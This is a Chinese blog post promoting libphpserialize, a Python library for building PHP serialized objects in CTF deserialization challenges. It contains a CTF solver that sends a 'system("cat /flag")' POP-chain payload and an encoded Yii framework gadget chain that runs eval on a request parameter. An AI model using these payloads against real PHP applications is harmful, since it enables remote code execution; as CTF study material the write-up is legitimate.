---
title: python实现的php序列化
date: 2021-6-15
tags:
    - CTF
    - Toy
---

> 就单纯想推销一下[libphpserialize](https://github.com/frankli0324/libphpserialize)

## 如何用Python实现PHP的序列化

1. 脑补
2. 写代码

## 如何使用libphpserialize

### 安装

```bash
pip3 install libphpserialize
```

### 使用

```python
from phpserialize import serialize
print(serialize(1))
```

非常银杏方便

## 为什么不用php自己的serialize？

1. 不用在你的电脑上安装php
2. python有requests/httpx，php没有
3. 简化做题流程

想象一下这样的场景：

你在打一个比赛，在做一道反序列化相关的题目。你启动了一个定时销毁的容器，这个容器限时一个小时。你在第50分钟的时候找到了合适的pop链，并用5分钟用python写出了触发反序列化的python poc。

你慌忙地打开了一个新的文件，将类的定义拷贝了过来，给他们赋了各种属性，然后`echo serialize($obj);`，结果发现有个private属性，于是又慌忙地改成了 `echo urlencode(serialize($obj));`，又在命令行中 `php generate.php`，复制，粘贴进python脚本，执行脚本，最后发现题目里头的反序列化入口处他 `base64_decode` 了一下，于是又回头去将 `urlencode` 改成 `base64_encode`，复制，粘贴，执行python脚本，运行，502，你很愤怒，用浏览器去访问了一下这个链接，发现容器已经过期了。你人麻了。

{% asset_img timeout.png %}

再想象一下这样的场景：

你已经成功地构造好了pop链，但是这个链非常长，而且需要精巧地构造属性值。你觉得用python构造这样的属性最简单，但是又不得不print出来然后粘贴到php代码里。你构造好了 `system('cat /flag');` 的payload，结果发现出题人在 `disable_functions` 中禁用了system函数。你不得不重新来一遍整个流程，构造属性，复制粘贴，生成序列化串，将序列化串粘回到python脚本里，请求。可是你突然发现你构造出来的序列化后的串突然用不了了，你找了10分钟，最后发现由于终端输出的字符数量限制，你只复制了一半。你非常气愤，直接在python脚本里 `payload = input()`，然后直接用管道符运行 `php generate.php | python3 exp.py`，结果发现仍然打不通。你又找了半天，发现php代码里用于调试的几个var_dump没有删。你一怒之下关闭了vscode，打开了LOL，找几个憨批进行一个人的祖安，还破坏了他人的游戏体验。

{% asset_img defeat.jpeg %}

再想象一下：

你的队友找到了一条pop链，但是二话不说给你发过来这样一串谜语

```url
?r=site%2Fabout&message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MzI6InlpaVxjYWNoaW5nXEV4cHJlc3Npb25EZXBlbmRlbmN5IjoxOntzOjEwOiJleHByZXNzaW9uIjtzOjIzOiJldmFsKCRfUkVRVUVTVFsiYW50Il0pOyI7fWk6MTtzOjE4OiJldmFsdWF0ZURlcGVuZGVuY3kiO319fQo=&ant=phpinfo();
```

你的眼睛都要看瞎了，可是你访问了这个url，竟然真的打通了。你接下来想继续往进探一探，于是打开了hackbar，痛苦地一个字符一个字符地去改。你题做完了，眼睛也废了。结果你的憨批队友又不想写wp，想让你来写。你想打游戏，于是也贴了这么一大长串。评论区生气了，说你这谁**看得懂。

如果你有类似的经历，那你可以用libphpserialize来拯救你快乐的一天。

## 示例

{% spoiler 强网杯2021，pop_master %}

```python
from phpserialize import serialize
from requests import session

from phply import phplex
from phply.phpast import *
from phply.phpparse import make_parser

ses = session()
classes = {}
func2class = {}
parser = make_parser()
good_paths = []

with open('class.php') as file:
    lexer = phplex.lexer.clone()
    ast = parser.parse(file.read(), lexer=lexer)
    for cls in ast:
        for i in cls.nodes:
            if type(i) is Method:
                func2class[i.name] = cls.name
        classes[cls.name] = cls


def is_good_assign(ctx_param, node: Assignment):
    assert type(node) == Assignment
    if ctx_param.name == node.node.name:
        if type(node.expr) == BinaryOp:
            if node.expr.op == '.':
                if node.expr.left.name == ctx_param.name:
                    return True
                else:
                    return False
            else:
                print(node)
                # unexpected
        elif type(node.expr) == Variable:
            if node.expr.name == ctx_param.name:
                return True
            return False
        return False
    return True


def handle_if(ctx_param, node: If):
    assert type(node) == If
    if type(node.expr) is BinaryOp:
        # debug
        if eval(str(node.expr.left)+node.expr.op+str(node.expr.right)):
            for n in node.node.nodes:
                if type(n) is Assignment and not is_good_assign(ctx_param, n):
                    return False
    elif type(node.expr) is FunctionCall:
        if node.expr.name == 'method_exists':
            func = node.expr.params[1].node
            assert(type(func) == str)
            search(classes[func2class[func]],
                   node.expr.params[0].node.name, func)
        else:
            print('unexpected call')
    else:
        print('unexpected expr')
    return True


def handle_method(ctx, method):
    ctx.param = method.params[0]
    for i in method.nodes:
        if type(i) is For:
            for n in i.node.nodes:
                if type(n) is Assignment and not is_good_assign(method.params[0], n):
                    return False
        elif type(i) is If:
            if not handle_if(method.params[0], i):
                return False
        elif type(i) is MethodCall:
            search(classes[func2class[i.name]], i.node.name, i.name)
        elif type(i) is Assignment:
            if not is_good_assign(method.params[0], i):
                return False
        elif type(i) is Eval:
            return True


def search(node, attr, method, path=[]):
    path.append((node, attr, method))
    for i in node.nodes:
        if type(i) is Method and i.name == method:
            ctx = type('', (object,), {})()
            if handle_method(ctx, i):
                good_paths.append(list(path))
    path.pop()


good_paths = []
search(classes['dLEWX3'], '', 'L8IHXt')
print(len(good_paths))
for n, a, m in good_paths[0]:
    print(n.name, a, m)


def prop_call(parent, attr, cls):
    setattr(parent, attr, type(cls, (object,), {})())
    return getattr(parent, attr)


root = type('dLEWX3', (object,), {})()
node = root
path = good_paths[0]
for i in range(1, len(path)):
    node = prop_call(node, path[i][1], path[i][0].name)
print(serialize(root))

print(ses.get('http://my_instance.cloudeci1.ichunqiu.com/', params={
    'pop': serialize(root),
    'argv': 'system("cat /flag"); //',
}).text)
```

{% endspoiler %}

这道题需要解析php源码的ast，并且进行搜索，去掉不可用的假链，找到唯一的一条真链。

{% spoiler CTFHUB framework %}

{% asset_img yii.jpg %}

{% endspoiler %}

这道题是一道比较常规的框架反序列化，payload需要base64_encode后发送

WIP
